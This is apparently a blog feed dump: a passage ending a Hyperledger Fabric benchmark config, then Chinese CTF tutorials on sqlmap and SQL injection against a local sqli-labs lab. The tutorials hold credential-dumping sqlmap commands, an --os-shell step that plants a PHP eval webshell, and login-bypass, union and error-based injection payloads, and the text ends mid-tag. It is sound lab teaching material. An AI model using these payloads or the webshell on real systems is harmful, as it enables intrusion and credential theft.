class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition of nodes</span></span><br><span class="line"><span class="comment"># addr address for node</span></span><br><span class="line"><span class="comment"># tls_ca_cert tls cert</span></span><br><span class="line"><span class="attr">peer1:</span> <span class="meta">&amp;peer1</span></span><br><span class="line">  <span class="attr">addr:</span> <span class="string">localhost:7051</span></span><br><span class="line">  <span class="attr">ssl_target_name_override:</span> <span class="string">peer0.org1.example.com</span></span><br><span class="line">  <span class="attr">org:</span> <span class="string">org1</span></span><br><span class="line">  <span class="attr">tls_ca_cert:</span> <span class="string">../fixtures/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/msp/tlscacerts/tlsca.org1.example.com-cert.pem</span></span><br><span class="line"></span><br><span class="line"><span class="attr">peer2:</span> <span class="meta">&amp;peer2</span></span><br><span class="line">  <span class="attr">addr:</span> <span class="string">localhost:9051</span></span><br><span class="line">  <span class="attr">ssl_target_name_override:</span> <span class="string">peer0.org2.example.com</span></span><br><span class="line">  <span class="attr">org:</span> <span class="string">org2</span></span><br><span class="line">  <span class="attr">tls_ca_cert:</span> <span class="string">../fixtures/crypto-config/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/msp/tlscacerts/tlsca.org2.example.com-cert.pem</span></span><br><span class="line"></span><br><span class="line"><span class="attr">orderer1:</span> <span class="meta">&amp;orderer1</span></span><br><span class="line">  <span class="attr">addr:</span> <span class="string">localhost:7050</span></span><br><span class="line">  <span class="attr">ssl_target_name_override:</span> <span class="string">orderer.example.com</span></span><br><span class="line">  <span class="attr">org:</span> <span class="string">org1</span></span><br><span class="line">  <span class="attr">tls_ca_cert:</span> <span class="string">../fixtures/crypto-config/ordererOrganizations/example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span></span><br><span class="line"></span><br><span class="line"><span class="attr">policyFile:</span> <span class="string">./test/andLogic.rego</span></span><br><span class="line"><span class="comment"># Peer Nodes to interact with as endorsement Peers</span></span><br><span class="line"><span class="attr">endorsers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="meta">*peer1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="meta">*peer2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Peer Nodes to interact with as Commit Peers as listening</span></span><br><span class="line"><span class="attr">committers:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="meta">*peer1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="meta">*peer2</span></span><br><span class="line"><span class="comment"># we might support multi-committer in the future for more complex test scenario.</span></span><br><span class="line"><span class="comment"># i.e. consider tx committed only if it&#x27;s done on &gt;50% of nodes. </span></span><br><span class="line"><span class="comment"># Give your commit Threshold as numbers for peers here.</span></span><br><span class="line"><span class="attr">commitThreshold:</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># orderer Nodes to interact with</span></span><br><span class="line"><span class="attr">orderer:</span> <span class="meta">*orderer1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Invocation configs</span></span><br><span class="line"><span class="attr">channel:</span> <span class="string">mychannel</span></span><br><span class="line"><span class="attr">chaincode:</span> <span class="string">fabcar</span></span><br><span class="line"><span class="comment"># chain code args below, in a list of str</span></span><br><span class="line"><span class="comment"># we provides 3 kinds of randmon</span></span><br><span class="line"><span class="comment"># uuid</span></span><br><span class="line"><span class="comment"># randomString$length</span></span><br><span class="line"><span class="comment"># randomNumber$min_$max</span></span><br><span class="line"><span class="attr">args:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">queryAllCars</span></span><br><span class="line"><span class="comment"># Tx submiter information </span></span><br><span class="line"><span class="attr">mspid:</span> <span class="string">Org1MSP</span></span><br><span class="line"><span class="attr">private_key:</span> <span class="string">../fixtures/crypto-config/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp/keystore/priv_sk</span></span><br><span class="line"><span class="attr">sign_cert:</span> <span class="string">../fixtures/crypto-config/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp/signcerts/User1@org1.example.com-cert.pem</span></span><br><span class="line"><span class="comment"># network traffic control</span></span><br><span class="line"><span class="attr">num_of_conn:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">client_per_conn:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><h3 id="运行">运行</h3><p>在tape目录下执行<code>./tape -c config.yaml -n 10000</code>，该命令的含义是，使用 config.yaml 作为配置文件，向 Fabric 网络发送10000条交易进行性能测试</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
          <category> Hyperledger Fabric </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blockchain </tag>
            
            <tag> Hyperledger Fabric </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之sqlmap的使用方法</title>
      <link href="/posts/2f65c0c4.html"/>
      <url>/posts/2f65c0c4.html</url>
      
        <content type="html"><![CDATA[<h2 id="使用sqlmap进行SQL注入">使用sqlmap进行SQL注入</h2><h3 id="1-扫描注入漏洞类型">1.扫描注入漏洞类型</h3><p>语法：<code>-u [url]</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span></span><br></pre></td></tr></table></figure><p>将我们要扫描的网站URL填入到命令中，运行后会输出结果：</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707111806514.png" alt="image-20200707111806514"></p><p>从结果中可以看到网站的注入点在id这里，是以GET的方式提交的，并且网站存在4中类型的SQL注入漏洞，分别是布尔型盲注、报错注入、时间型盲注和联合查询注入</p><h3 id="2-查询数据库名">2.查询数据库名</h3><p>语法：<code>-u [url] --current-db</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">--current-db</span></span><br></pre></td></tr></table></figure><p>运行完成后会直接显示出当前使用的数据库</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707112737101.png" alt="image-20200707112737101"></p><h3 id="3-查表名">3.查表名</h3><p>语法：<code>-u [url] -D [database_name] --tables</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">--tables</span></span><br></pre></td></tr></table></figure><p>工具会自动查出数据库中所包含的数据表</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707133149836.png" alt="image-20200707133149836"></p><h3 id="4-查字段（可选）">4.查字段（可选）</h3><p>查完数据表后就可以选一个我们需要的表进行下一步的查询</p><p>查询users表中存在的字段</p><p>语法：<code>-u [url] -D [database_name] -T [table_name] --columns</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">--columns</span></span><br></pre></td></tr></table></figure><p>会将表中的所有字段都进行输出</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707133845962.png" alt="image-20200707133845962"></p><h3 id="5-查数据">5.查数据</h3><p>当我们拿到了字段名后，就可以爆破每个字段的数据了</p><p>语法：<code>-u [url] -D [database_name] -T [table_name] -C [column_name] --dump</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">-C</span> <span class="string">&quot;username,password&quot;</span> <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><p>我们选择了爆破username和password</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707134431168.png" alt="image-20200707134431168"></p><p>⚠当然我们可以直接跳过第4步爆破字段名，直接将数据表中的所有数据爆破出来</p><p>语法：<code>-u [url] -D [database_name] -T [table_name] --dump</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707134858597.png" alt="image-20200707134858597"></p><h3 id="使用sqlmap上传一句话木马">使用sqlmap上传一句话木马</h3><p>一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qqq&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以使用sqlmap将一句话木马文件利用SQL注入漏洞上传到服务器中，并且会利用这个木马获取目标主机shell。它使用的其实是<code>select *** into outfile</code>语句，这语句的意思是将查询的表的内容导出到一个文件中。sqlmap就是利用这个特点将一句话木马导出为php文件到网站的目录中。</p><p>来看一下sqlmap上传一句话木马并获取shell的语法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">--os-shell</span></span><br></pre></td></tr></table></figure><p>运行后会提示选择web应用程序的语言</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707173222233.png" alt="image-20200707173222233"></p><p>这里我们对应选择第4个选项的PHP</p><p>然后会提示是否更深入泄露根路径，这里默认回车即可</p><p>再然后会让选择想要被写入木马文件的目录，选择第2个</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707174042426.png" alt="image-20200707174042426"></p><p>然后输入网站根目录的完整路径</p><blockquote><p>对于具体路径的获取，可以通过网站的报错信息获得，也可以通过自动生成的phpinfo.php(PHP探针文件)获得</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707175115679.png" alt="image-20200707175115679"></p><p>对目录注入了木马文件之后，就可以直接获得目标服务器的shell了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707202404125.png" alt="image-20200707202404125"></p><p>如果我们使用浏览器访问注入的第一个php文件，会发现sqlmap开启了一个文件上传后门，可以任意上传任意文件到网站目录</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707202819227.png" alt="image-20200707202819227"></p><p>如果访问第二个php文件，会提示未定义索引，并且会提示cmd是作为传入php文件的参数，猜测是POST方式的请求</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707203446084.png" alt="image-20200707203446084"></p><p>使用HackBar用POST方式提交cmd参数，可以看到页面有输出</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707203648584.png" alt="image-20200707203648584"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> sqlmap </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入原理及注入过程</title>
      <link href="/posts/e73517db.html"/>
      <url>/posts/e73517db.html</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入简介">SQL注入简介</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><blockquote><p>SQL注入的学习过程我使用GitHub的一个开源项目进行练习<a href="https://github.com/Audi-1/sqli-labs">[Sqli-Lab项目地址]</a></p></blockquote><h2 id="万能密码">万能密码</h2><p>这里使用的是<code>Less-11</code>进行试验</p><p><code>Less-11</code>的页面存在一个的登录框</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706094848871.png" alt="image-20200706094848871"></p><p>一般最简单的登录框在登陆的时候是直接传参到数据库中进行查询，所使用的查询语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;;</span><br></pre></td></tr></table></figure><h3 id="1-逻辑或注入">1.逻辑或注入</h3><p>如果我们使where条件为真，那么必然会有查询结果输出</p><p>我们可以在username中输入任意值，在password中输入<code>1' or '1'='1</code>，提交之后可以看到我们使用Dumb账户登陆成功了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706100142370.png" alt="image-20200706100142370"></p><p>分析一下，如果我们使用这样的密码进行登录，所对应的数据库查询语句一般为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;123&#x27; and password=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure><p>由于or后面的<code>'1'='1'</code>的布尔值是必然为真，所以where语句的结果也必然为真，所以页面会使用从数据库中查询出来的第一个账户进行登录</p><p>那么如果我们不想使用第一个账户进行登录该怎么办呢？</p><p>可以使用limit限制查询输出，从而达到使用其他账户进行登录的目的，在password中注入：<code>1' or 1=1 limit 7,1 -- +</code></p><p>提交后发现使用admin账户进行了登录</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706103346976.png" alt="image-20200706103346976"></p><p>分析一下，将注入的数据代入SQL语句可以看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;123&#x27; and password=&#x27;1&#x27;  or 1=1 limit 7,1 -- +;</span><br></pre></td></tr></table></figure><p>当我们限制在第8个查询位输出的时候，就可以以admin账号进行登录了</p><h3 id="2-注释符注入">2.注释符注入</h3><p>在登陆查询的时候，where语句会匹配username和password两个字段，如果我们将password字段的匹配语句使用注释符注释掉，那么就可以实现以数据库中的任意账户进行登录</p><p>如图，username中注入<code>admin'/*</code>，password中注入<code>*/'</code>，提交查询后我们就可以看到网页以admin账户进行登录了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706110849938.png" alt="image-20200706110849938"></p><p>再来到具体的SQL语句中进行分析，我们注入后，数据库要执行的查询语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;admin&#x27;/*&#x27; and password=&#x27;*/&#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>可以看到SQL语句中有一部分被注释掉了，数据库实际所执行的语句是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;admin&#x27;&#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>我们注释掉了password字段的匹配处理，从而可以使得我们以admin账号任意登陆</p><p>以上两种注入方式就是一般情况下所使用的的万能密码注入。</p><h2 id="联合注入">联合注入</h2><p>此注入方式只适合数据库查询的信息在页面有显示的情况下才能使用。</p><h3 id="1-测注入点">1.测注入点</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1</span><br></pre></td></tr></table></figure><p>看上面这个URL，是以GET的方式请求页面数据，猜测在<code>id=1</code>处存在注入点</p><p>尝试在参数值的后面添加引号或者右括号来测试，如果页面产生报错信息，则极有可能存在注入点，比如在id的参数值后面加个单引号，提交后页面提示有语法错误，我们就可以判断存在SQL注入漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705180207890.png" alt="image-20200705180207890"></p><h3 id="2-求闭合字符">2.求闭合字符</h3><p>一般可以使SQL语句闭合的符号有三个：<code>'</code>、<code>&quot;</code>和<code>)</code>，我们可以通过自由组合或者选择其中一个进行测试</p><p>具体该用哪个闭合字符，我们可以使用逻辑与进行判断</p><ul><li>and 1=1</li><li>and 1=2</li></ul><p>根据SQL语句的语法规则，如果我们正常闭合了前面的语句，那么后面的语句则会被正常执行。即当我们在后面注入<code>and 1=1</code>的时候，页面输出的结果应该与不带任何注入语句一样；当我们注入<code>and 1=2</code>的时候，由于<code>1=2</code>的逻辑判断值为假，页面应该不会有任何输出。所以如果我们正确注入了闭合字符，则会满足上面两个条件。</p><p>下面来看几个例子：</p><p>首先尝试使用双引号判断注入字符，可以看到能正常输出</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705193428823.png" alt="image-20200705193428823"></p><blockquote><p>这里URL中的<code>%23</code>是URL编码，转为字符就是<code>#</code>，<code>#</code>在SQL语句中代表注释，它会注释掉后面的所有SQL语句，使其不再执行</p></blockquote><p>然后我们再注入<code>and 1=1</code>，同样可以正常输出</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705193620938.png" alt="image-20200705193620938"></p><p>再注入<code>and 1=2</code>，依然可以输出</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705193637969.png" alt="image-20200705193637969"></p><p>那么就可以判断双引号是没法使SQL语句闭合的</p><p>再换单引号进行尝试，当在单引号后面注入<code>and 1=2</code>的时候，会发现页面上的输出为空，那么证明我们的闭合是有效的</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705193710222.png" alt="image-20200705193710222"></p><p>由此可以确定此处需要使用的闭合字符为单引号<code>'</code></p><h3 id="3-求列数">3.求列数</h3><p>在SQL注入的时候，我们需要知道数据库后台一共查询了几列数据，才能利用网页源码中的函数将我们所需要的信息输出到页面上</p><p>确定查询的字段数可以使用<code>order by</code>函数，后面跟我们猜测的字段数，要是后面跟着的数字超出了字段数的时候，则会报错！通过这个我们可以确定网页所查询数据库的字段数。</p><p>当我们要求按照第三列数据进行排序的时候，页面不会显示任何信息</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705194441449.png" alt="image-20200705194441449"></p><p>然而当改为按照第四列排序的时候，会发现页面显示了报错信息，提示没有第4列数据</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705194534155.png" alt="image-20200705194534155"></p><p>这时我们就可以判断网页源码通过数据库查询出来的数据有三个字段</p><h3 id="4-求显示位">4.求显示位</h3><p>为什么要求显示位？因为某些原因，开发人员在编写网页代码的时候，并不一定将查询到的所有数据都显示在网页上，可能只会显示其中的某几列数据，这时候我们就需要确定显示在页面上的是哪几列，这样才能让我们后面查询到的隐秘信息正确输出在页面中。</p><p>比如下面的PHP源码：<a href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/test.sql">test数据库文件下载</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$connect</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;set names &#x27;gbk&#x27;&quot;</span>,<span class="variable">$connect</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ida</span> = <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;select name,age,email from information where id = &quot;&#x27;</span>.<span class="variable">$ida</span>.<span class="string">&#x27;&quot; limit 0,1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$query</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网页从数据库中查询了三个字段：<code>name</code>,<code>age</code>,<code>email</code>，但是网页只输出了<code>name</code>和<code>age</code>两个字段。</p><p>上面第3步确定了查询的字段数之后，我们就可以使用联合查询输出指定字符来判断显示位</p><p>先看一个在数据库命令行中的查询结果</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705201854090.png" alt="image-20200705201854090"></p><p>直接<code>select 1,2,3</code>，则也会直接在查询结果中显示出来</p><p>所以我们联合查询选择1,2,3，通过判断输出显示的数字就可以判断显示位</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705202235782.png" alt="image-20200705202235782"></p><p>可以看到页面显示出来的是2和3，证明显示位是第二列和第三列的数据</p><blockquote><p>URL中的<code>--+</code>其实也是注释符，与上面的<code>#</code>是同样的效果</p></blockquote><h3 id="5-求库名">5.求库名</h3><p>数据库名的查询可以借助于<code>database()</code>函数，这个函数会输出当前查询所使用的数据库的名称</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705202828408.png" alt="image-20200705202828408"></p><p>这里查询出来的数据库名为<code>security</code></p><h3 id="6-求表名">6.求表名</h3><p>表名和字段名（列名）的查询需要借助<code>information_schema</code>这个数据库，在这个数据库中存储着当前用户名下所有数据库、数据表和表内字段的基本信息。</p><p>求表名需要查询这个数据库中的<code>tables</code>数据表，同样借助于联合查询进行输出</p><p>注入的语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,table_name,2 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705203450905.png" alt="image-20200705203450905"></p><p>但是这只输出了一个数据表的名称，显然emails并不是我们想要的表，要想输出查询结果中的所有表的名称，可以使用连接函数<code>group_concat()</code>将所有的结果连接为一个字符串输出</p><p>连接后的语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705203807557.png" alt="image-20200705203807557"></p><p>根据名称的含义可以猜测，users表即为我们迫切想要求得的表</p><h3 id="7-求列名（字段名）">7.求列名（字段名）</h3><p>用与上面同样的方法求列名，这次查询的是<code>columns</code>表</p><p>注入语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- +</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705204121926.png" alt="image-20200705204121926"></p><p><code>username</code>和<code>password</code>字段就是我们想要的结果</p><h3 id="7-求列名">7.求列名</h3><h3 id="8-查数据">8.查数据</h3><p>知道了表名和字段名后，我们就可以通过注入的方式拿到存在数据库中的用户名和密码了</p><p>还是使用联合查询进行注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,group_concat(username,0x23,password),2 from security.users -- +</span><br></pre></td></tr></table></figure><p>将<code>username</code>和<code>password</code>使用<code>#</code>进行拼接后输出，得到的结果为</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705204458093.png" alt="image-20200705204458093"></p><p>从结果中可以直接看到账号admin的密码为admin</p><p>—至此便完成了联合查询的SQL注入的整个过程。</p><h2 id="报错注入">报错注入</h2><p><strong>updatexml()函数</strong></p><p><strong>UPDATEXML (XML_document, XPath_string, new_value);</strong></p><ul><li><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p></li><li><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p></li><li><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p></li><li><p>作用：改变文档中符合条件的节点的值(改变XML_document中符合XPATH_string的值)</p></li></ul><p>当updatexml函数的第二个参数XPath_string未满足XPath语法的时候，会产生报错并带出关键信息。但是这个函数能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用字符串截取函数或者分段显示进行处理。</p><h3 id="1-测注入点-2">1.测注入点</h3><h3 id="2-求闭合字符-2">2.求闭合字符</h3><p>这两步与上面联合注入的过程一样，此处就不再赘述<a href="/posts/e73517db.html#1%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9">[传送门]</a></p><h3 id="3-求库名">3.求库名</h3><p>注入语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select concat(0x23,database(),0x23)),1) -- +</span><br></pre></td></tr></table></figure><p>这里将查询使用<code>#</code>包起来是为了使得查询报错，例如查询一个开头为<code>#</code>字段，数据库肯定会报错</p><p>上面注入语句的查询结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705221108478.png" alt="image-20200705221108478"></p><p>可以看到报错泄露出来的数据库名为<code>security</code></p><h3 id="4-求表名">4.求表名</h3><p>嵌入select查询语句，在<code>information_schema</code>库中查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select group_concat(0x23,table_name,0x23) from information_schema.tables where table_schema=&#x27;security&#x27;),1) -- +</span><br></pre></td></tr></table></figure><p>查询结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705221511811.png" alt="image-20200705221511811"></p><p>可以看到在报错信息中泄露出了我们需要的表名，但是由于字数限制，查询结果显示不全，所以需要我们进一步处理：（两种方法）</p><ol><li>使用字符串切片函数<code>substr()</code>对查询结果进行分割</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select substr(group_concat(0x23,table_name,0x23),20,30) from information_schema.tables where table_schema=&#x27;security&#x27;),1) -- +</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705222306824.png" alt="image-20200705222306824"></p><ol 